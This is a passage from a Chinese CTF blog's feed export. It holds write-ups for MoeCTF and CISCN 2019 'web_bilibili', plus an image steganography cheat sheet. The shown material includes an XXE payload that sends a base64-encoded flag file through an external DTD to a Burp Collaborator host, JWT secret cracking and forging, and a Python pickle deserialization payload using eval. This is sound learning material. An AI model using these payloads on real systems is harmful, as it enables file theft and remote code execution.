version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE updateProfile [</span><br><span class="line">    &lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;file:&#x2F;flags&#x2F;flag1.txt&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % dtd SYSTEM &quot;http:&#x2F;&#x2F;3l365568x0.qicp.vip&#x2F;evil.dtd&quot;&gt;</span><br><span class="line">    %dtd;</span><br><span class="line">    %send;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;hhh&gt;%send&lt;&#x2F;hhh&gt;</span><br><span class="line">&lt;!-?file&#x3D;bW9lY3Rme1hYRV8&#x3D; HTTP&#x2F;1.0-!&gt;</span><br><span class="line">&lt;!-moectf&#123;XXE_-!&gt;</span><br></pre></td></tr></table></figure><p>evil.dtd：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % all</span><br><span class="line">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http:&#x2F;&#x2F;143prtfigtjj9yd67c8sizi6ux0qof.burpcollaborator.net&#x2F;?file&#x3D;%file;&#39;&gt;&quot;</span><br><span class="line"> &gt;</span><br><span class="line">%all;</span><br></pre></td></tr></table></figure><h1 id="Andriod"><a href="#Andriod" class="headerlink" title="Andriod"></a>Andriod</h1><h2 id="01-Click-it！"><a href="#01-Click-it！" class="headerlink" title="01 Click it！"></a>01 Click it！</h2><h3 id="解题过程-28"><a href="#解题过程-28" class="headerlink" title="解题过程"></a>解题过程</h3><p><del>手撕大法好</del>   <del>致敬Rx</del></p><p><img src="https://i.loli.net/2020/10/13/xuojwR3PDnlfSzs.png" alt="image-20200923224110466.png"></p><h4 id="世界线2-3"><a href="#世界线2-3" class="headerlink" title="世界线2"></a>世界线2</h4><p>CE搜索内存，修改。</p><p><img src="https://i.loli.net/2020/10/13/DLesytbjApq86Ro.png" alt="image-20200923225653333.png"></p><hr><h2 id="02-Baby-Android"><a href="#02-Baby-Android" class="headerlink" title="02 Baby Android!"></a>02 Baby Android!</h2><h3 id="解题过程-29"><a href="#解题过程-29" class="headerlink" title="解题过程"></a>解题过程</h3><p> AndroidKiller逆向，用Java Decomplier查看com.example.signin/MainActivity.class</p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include&lt;bits/stdc++.h&gt;</span></span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">string key = <span class="string">&quot;dalaomenbiedale&quot;</span>;</span><br><span class="line">  int secret[] = &#123; <span class="number">9</span>, <span class="number">14</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">27</span>, <span class="number">11</span>, <span class="number">30</span>, <span class="number">55</span>, <span class="number">82</span>, <span class="number">28</span>, <span class="number">58</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">92</span>, <span class="number">18</span>, <span class="number">59</span>,<span class="number">33</span>, <span class="number">34</span>, <span class="number">5</span>, <span class="number">29</span>, <span class="number">2</span>, <span class="number">84</span>, <span class="number">10</span>, <span class="number">61</span>, <span class="number">11</span>, <span class="number">86</span>, <span class="number">16</span>, <span class="number">21</span>, <span class="number">95</span>, <span class="number">23</span>, <span class="number">59</span>, <span class="number">53</span>, <span class="number">4</span>, <span class="number">82</span>, <span class="number">1</span>, <span class="number">50</span>, <span class="number">40</span>, <span class="number">11</span>, <span class="number">67</span>, <span class="number">20</span> &#125;;</span><br><span class="line"><span class="keyword">for</span> (int i = <span class="number">0</span>; i &lt; <span class="number">40</span>; i++)&#123;</span><br><span class="line">char a = secret[i] ^ (int)key[i % key.length()];</span><br><span class="line">cout&lt;&lt;a;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;比赛介绍&quot;&gt;&lt;a href=&quot;#比赛介绍&quot; class=&quot;headerlink&quot; title=&quot;比赛介绍&quot;&gt;&lt;/a&gt;比赛介绍&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;MoeCTF是西安电子科技大学一年一度的信息安全新生夺旗赛, 由西电信息安全协会面向全体准大学生举办, 题目难度不高且坡度平缓, 比赛平台开设时间很长, 0基础新生可以通过本次比赛对信息安全夺旗赛(CTF)有一个基础且全面的认识, 中学参加过一些CTF比赛的准大学生们也可以通过本次比赛重温CTF赛事.&lt;/p&gt;
&lt;p&gt;MoeCTF除了设有常规CTF比赛相关的分类之外也开设或有计划开设了算法编程类, 运维类, 旨在提供一个知识覆盖全面的做题环境, 同时帮助有过信息学竞赛经历的新生们更快转型.&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="WriteUp" scheme="http://example.com/categories/CTF/WriteUp/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="MoeCTF" scheme="http://example.com/tags/MoeCTF/"/>
    
  </entry>
  
  <entry>
    <title>CISCN 2019 web_bilibili</title>
    <link href="http://example.com/2020/09/29/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_5421_Web_bilibili/"/>
    <id>http://example.com/2020/09/29/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_5421_Web_bilibili/</id>
    <published>2020-09-29T01:45:12.477Z</published>
    <updated>2020-10-16T01:57:50.965Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CISCN-2019-web-bilibili"><a href="#CISCN-2019-web-bilibili" class="headerlink" title="CISCN 2019 web_bilibili"></a>CISCN 2019 web_bilibili</h1><h2 id="题目地址"><a href="#题目地址" class="headerlink" title="题目地址"></a>题目地址</h2><p><a href="https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=5421&amp;page=3">https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=5421&amp;page=3</a></p><h2 id="题目提示"><a href="#题目提示" class="headerlink" title="题目提示"></a>题目提示</h2><p>薅羊毛与逻辑漏洞</p><a id="more"></a><h2 id="网站截图"><a href="#网站截图" class="headerlink" title="网站截图"></a>网站截图</h2><p><img src="https://i.loli.net/2020/09/29/hH8jkoWqmZvMy1f.jpg" alt="1.jpg"></p><h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><ol><li><p>先注册试试看。注册成功后尝试购买了一个账号，成功。</p><p><img src="https://i.loli.net/2020/09/29/8bAeomj5KkdDnW1.png" alt="image-20200807180927483.png"></p></li><li><p>浏览一下网页，发现了这样一句话：一定要买到lv6。突然想到之前ik*n买lv6账号爆睿站的事情。大概翻了几页，没看到lv6。检查元素后发现，每个等级对应的图片名称就是<code>lv</code>+等级+<code>.png</code></p><p><img src="https://i.loli.net/2020/09/29/CUIRvkdMwr52GZs.png" alt="image-20200807181222993.png"></p></li><li><p>python脚本伺候.找到第181页有lv6账号</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">r&#x27;http://220.249.52.133:47045/shop?page=&#x27;</span></span><br><span class="line"><span class="keyword">for</span> page <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">500</span>):</span><br><span class="line">    req = requests.get(url + str(page))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;lv6.png&#x27;</span> <span class="keyword">in</span> req.text:</span><br><span class="line">        print(<span class="string">&#x27;[+]FOUND!\n[+]At page&#x27;</span>,page)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></li><li><p>找到一个叫b*sh*的账号.价格真够贵.居然要1145141919,这么臭的价格,真的有买的必要吗?买一下试试,果然操作失败.</p><p><img src="https://i.loli.net/2020/09/29/WhcD5Iy8jq9HdSp.png" alt="image-20200807182130307.png"></p></li><li><p>发现有一个叫折扣的东西,看一下源代码.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;jumbotron&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>购物车<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;shopcar_list&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">&quot;list-group&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;list-group-item&quot;</span>&gt;</span>b*sh* <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/static/img/lv/lv6.png&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span>/&gt;</span> /</span><br><span class="line">1145141919.0</span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>优惠券:-20.0%<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>916113535.2<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;_xsrf&quot;</span> <span class="attr">value</span>=<span class="string">&quot;2|632dee6f|b462f5648dfa4b927eeb9581ad057b17|1596793343&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;id&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1624&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;price&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1145141919.0&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;discount&quot;</span> <span class="attr">value</span>=<span class="string">&quot;0.8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-danger&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>结算<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>注意到其中13-15行居然都是input标签,尝试修改.修改价格失败,修改折扣成功.点击结算后显示页面仅允许admin访问.</p><p><img src="https://i.loli.net/2020/09/29/p1YEPOjqwRyZmG7.png" alt="image-20200807182852209.png"></p></li><li><p>已经登陆账号,再有身份验证就应该和cookies有关了.查看cookies,有一个JWT.</p><p><img src="https://i.loli.net/2020/09/29/PVco83aCzr7suQS.png" alt="image-20200807183041972.png"></p></li></ol><blockquote><p>Json web token (JWT), 是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准&lt;a href=<a href="https://link.jianshu.com/?t=https://tools.ietf.org/html/rfc7519r&gt;RFC">https://link.jianshu.com?t=https://tools.ietf.org/html/rfc7519r&gt;RFC</a> 7519</a>.该token被设计为紧凑且安全的，特别适用于分布式站点的单点登录（SSO）场景。JWT的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源，也可以增加一些额外的其它业务逻辑所必须的声明信息，该token也可直接被用于认证，也可被加密。</p></blockquote><p>​        搜索JWT后找到了相关工具<a href=https://github.com/brendan-rius/c-jwt-cracker>jwt cracker</a>,破解SHA256，得到密钥1Kun</p><p>​            <img src="https://i.loli.net/2020/09/29/lyZhgSHod3tC7OM.png" alt="image-20200807185740445.png"></p><p>​        在JWT.io生成新的JWT</p><p><img src="https://i.loli.net/2020/09/29/WLFDPoYiymVx8fG.png" alt="image-20200807191017303.png"></p><p>​        修改cookies后刷新。</p><p><img src="https://i.loli.net/2020/09/29/jVE9oqwDz5fNdQG.png" alt="image-20200807191006876.png"></p><p>​        进入到新的界面，然而按钮点击无效。查看源码。</p><p><img src="https://i.loli.net/2020/09/29/yKaz46ChpvxgfQR.png" alt="image-20200807191126831.png"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;ui text container login-wrap-inf&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 潜伏敌后已久,只能帮到这了 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/static/asd1f654e683wq/www.zip&quot;</span> &gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">style</span>=<span class="string">&quot;visibility:hidden&quot;</span>&gt;</span>删库跑路前我留了好东西在这里<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;ui segments center padddd&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 对抗*站黑科技，目前为测试阶段，只对管理员开放 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;ui segment&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/static/img/b.png&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;ui segment&quot;</span>&gt;</span>This is Black Technology!<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;ui segment&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/b1g_m4mber&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;_xsrf&quot;</span> <span class="attr">value</span>=<span class="string">&quot;2|7d6064a8|aa2f7fa393b7c15560a61f46b348f1d0|1596793343&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">hidden</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">class</span>=<span class="string">&quot;f-m ui segment&quot;</span> <span class="attr">name</span>=<span class="string">&quot;become&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;&quot;</span> <span class="attr">value</span>=<span class="string">&quot;admin&quot;</span> <span class="attr">required</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;group&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">class</span>=<span class="string">&quot;ui secondary button &quot;</span>&gt;</span>一键成为大会员<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>​        绝了，这题做着做着，还有剧情了。<br>​        在网页上检查元素，删掉第14行中的hidden=”hidden”，显示出输入栏<br>​        第3行中有一个压缩文件，下载解压后得到了网站的源码。其中有admin.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="keyword">from</span> sshop.base <span class="keyword">import</span> BaseHandler</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AdminHandler</span>(<span class="params">BaseHandler</span>):</span></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self, *args, **kwargs</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.current_user == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;no_ass.html&#x27;</span>)</span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span>(<span class="params">self, *args, **kwargs</span>):</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            become = self.get_argument(<span class="string">&#x27;become&#x27;</span>)</span><br><span class="line">            p = pickle.loads(urllib.unquote(become))</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=p, member=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​        到这里我不会了，打开admin.py，把里面不认识的函数+漏洞作为关键词挨个搜索了之后，urllib.load()这个函数存在一个反序列化漏洞。按照blog里的仿写一个payload。<a href=https://www.cnblogs.com/cimuhuashuimu/p/11544463.html>反序列化漏洞</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 只能使用python2，python3因为不明原因无法正常生成payload</span></span><br><span class="line"><span class="keyword">import</span> pickle <span class="keyword">as</span> p</span><br><span class="line"><span class="keyword">import</span> urllib <span class="keyword">as</span> u</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">payload</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">       <span class="keyword">return</span> (eval, (<span class="string">&#x27;open(&quot;/flag.txt&quot;,&quot;r&quot;).read()&#x27;</span>,))</span><br><span class="line">a = p.dumps(payload())</span><br><span class="line">a = u.quote(a)</span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure><p>​        将输出的payload填进输入栏后即得到flag</p><p><img src="https://i.loli.net/2020/09/29/d14Rh3wYqOgWezu.png" alt="image-20200807193720295.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;CISCN-2019-web-bilibili&quot;&gt;&lt;a href=&quot;#CISCN-2019-web-bilibili&quot; class=&quot;headerlink&quot; title=&quot;CISCN 2019 web_bilibili&quot;&gt;&lt;/a&gt;CISCN 2019 web_bilibili&lt;/h1&gt;&lt;h2 id=&quot;题目地址&quot;&gt;&lt;a href=&quot;#题目地址&quot; class=&quot;headerlink&quot; title=&quot;题目地址&quot;&gt;&lt;/a&gt;题目地址&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://adworld.xctf.org.cn/task/answer?type=web&amp;amp;number=3&amp;amp;grade=1&amp;amp;id=5421&amp;amp;page=3&quot;&gt;https://adworld.xctf.org.cn/task/answer?type=web&amp;amp;number=3&amp;amp;grade=1&amp;amp;id=5421&amp;amp;page=3&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;题目提示&quot;&gt;&lt;a href=&quot;#题目提示&quot; class=&quot;headerlink&quot; title=&quot;题目提示&quot;&gt;&lt;/a&gt;题目提示&lt;/h2&gt;&lt;p&gt;薅羊毛与逻辑漏洞&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="WriteUp" scheme="http://example.com/categories/CTF/WriteUp/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="WEB" scheme="http://example.com/tags/WEB/"/>
    
    <category term="攻防世界" scheme="http://example.com/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    
  </entry>
  
  <entry>
    <title>CTF中的图片隐写</title>
    <link href="http://example.com/2020/09/28/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/"/>
    <id>http://example.com/2020/09/28/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/</id>
    <published>2020-09-28T06:02:09.036Z</published>
    <updated>2020-10-16T01:38:01.393Z</updated>
    
    <content type="html"><![CDATA[<ol><li><p>所有图片通用方法</p><ul><li><p>Stegosolve查看是否颜色通道隐写</p></li><li><p>UE查看内嵌字符串</p></li><li><p>Exiftool查看Exif信息</p></li><li><p>strings命令查看字符串，已知flag格式时可尝试搜索flag格式</p></li><li><p>binwalk查看是否有包含其他文件</p></li></ul></li></ol><a id="more"></a><ul><li><p>foremost分离包含文件</p></li><li><p>确定有包含其他文件，但foremost分离时卡死，使用dd命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$dd</span> <span class="keyword">if</span>=&lt;输入文件名&gt; of=&lt;输出文件名&gt; skip=&lt;输出文件文件块起始地址&gt; bs=1</span><br></pre></td></tr></table></figure></li><li><p>遇到两张几乎一样的图片，考虑叠加或找不同。叠加使用phototshop，找不同使用image_comperer.py</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">img1 = Image.open(<span class="string">&#x27;1.png&#x27;</span>)</span><br><span class="line">img2 = Image.open(<span class="string">&#x27;2.png&#x27;</span>)</span><br><span class="line">p1 = img1.load()</span><br><span class="line">p2 = img2.load()</span><br><span class="line">w = img1.size[<span class="number">0</span>]</span><br><span class="line">h = img1.size[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">img3 = Image.new(img1.mode, img1.size)</span><br><span class="line">p3 = img3.load()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(w):</span><br><span class="line">    cnt = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(h):</span><br><span class="line">        <span class="keyword">if</span> p1[i, j] != p2[i, j]:</span><br><span class="line">            p3[i, j] = (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>)</span><br><span class="line"></span><br><span class="line">im3.save(<span class="string">&#x27;result.png&#x27;</span>)</span><br></pre></td></tr></table></figure></li></ul><ol start="2"><li><p>png文件</p><ul><li>pngcheck</li><li>修改文件头以改变图片高度、宽度</li><li>zsteg</li></ul></li><li><p>gif文件</p><ul><li>Namo Gif Animator分离帧</li></ul></li><li><p>bmp</p><ul><li><a href=https://github.com/zed-oxff/zsteg>zsteg</a> 需要ruby环境</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">usage:</span><br><span class="line"><span class="variable">$zsteg</span> &lt;filename&gt; <span class="string">&#x27;查看LSB信息</span></span><br><span class="line"><span class="string">$zsteg &lt;filename&gt; -b 1 -o xy -v &#x27;</span>检测zlib</span><br><span class="line"><span class="variable">$zsteg</span> &lt;filename&gt; -v  <span class="string">&#x27;显示细节</span></span><br><span class="line"><span class="string">$zsteg &lt;filename&gt; -a  &#x27;</span>尝试所有的组合</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    
    <summary type="html">&lt;ol&gt;
&lt;li&gt;&lt;p&gt;所有图片通用方法&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;Stegosolve查看是否颜色通道隐写&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;UE查看内嵌字符串&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Exiftool查看Exif信息&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;strings命令查看字符串，已知flag格式时可尝试搜索flag格式&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;binwalk查看是否有包含其他文件&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="做题套路" scheme="http://example.com/categories/CTF/%E5%81%9A%E9%A2%98%E5%A5%97%E8%B7%AF/"/>
    
    
    <category term="隐写" scheme="http://example.com/tags/%E9%9A%90%E5%86%99/"/>
    
    <category term="图片" scheme="http://example.com/tags/%E5%9B%BE%E7%89%87/"/>
    
  </entry>
  
  <entry>
    <title>xxd - make a hex dump or do the  reverse</title>
    <link href="http://example.com/2020/09/28/%E6%96%87%E4%BB%B6%E5%8F%8D%E8%BD%AC/"/>
    <id>http://example.com/2020/09/28/%E6%96%87%E4%BB%B6%E5%8F%8D%E8%BD%AC/</id>
    <published>2020-09-28T06:01:53.548Z</published>
    <updated>2020-09-29T01:47:12.309Z</updated>
    
